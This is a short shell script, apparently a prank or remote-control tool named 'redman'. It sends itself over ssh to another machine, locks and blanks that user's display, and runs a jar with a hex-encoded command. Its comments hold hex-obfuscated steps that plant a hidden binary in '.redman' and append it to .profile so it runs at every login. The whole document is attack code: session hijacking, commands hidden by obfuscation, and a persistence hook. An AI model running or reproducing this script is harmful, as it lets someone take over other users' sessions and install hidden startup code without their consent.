#!/bin/sh


lock() {
    xprop > /dev/null &&
    lock
}
if [ -n "$1" ]; then
    ssh $1 "bash -s" < redman.sh
else
    echo "connected"
    export DISPLAY=:0.0 &&
    lock&
    export DISPLAY=:0.0 &&
    echo "locked" &&
    xrandr --output $(xrandr -q | sed -n '/ connected/p' | sed 's/connected.*/ /g') --off &&
    java -jar /auto_home/nlephilippe/Documents/redman/redman.jar "echo 2f61 7574 6f5f 686f 6d65 2f6e 6c65 7068 696c 6970 7065 2f66 6972 6566 6f78 | xxd -r -p" &&
    xrandr --output $(xrandr -q | sed -n '/ connected/p' | sed 's/connected.*/ /g') --auto &&
    killall xfce4-terminal
    killall xprop
fi

#mkdir ".redman"
#6d6b 6469 7220 222e 7265 646d 616e 22

#cp "/auto_home/nlephilippe/Documents/redman/redman" ".redman/redman"
#6370 2022 2f61 7574 6f5f 686f 6d65 2f6e 6c65 7068 696c 6970 7065 2f44 6f63 756d 656e 7473 2f72 6564 6d61 6e2f 7265 646d 616e 2220 222e 7265 646d 616e 2f72 6564 6d61 6e22

#echo ".redman/redman whoami&" >> .profile
#6563 686f 2022 2e72 6564 6d61 6e2f 7265 646d 616e 2077 686f 616d 6926 2220 3e3e 202e 7072 6f66 696c 65

#.redman/redman whoami
#2e72 6564 6d61 6e2f 7265 646d 616e 2077 686f 616d 69

#"mkdir .redman; cp /auto_home/nlephilippe/Documents/redman/redman .redman/redman ; echo \".redman/redman whoami&\" >> .profile ;  .redman/redman whoami"

#2f61 7574 6f5f 686f 6d65 2f6e 6c65 7068 696c 6970 7065 2f66 6972 6566 6f78

#$(echo 2f61 7574 6f5f 686f 6d65 2f6e 6c65 7068 696c 6970 7065 2f66 6972 6566 6f78 | xxd -r -p)
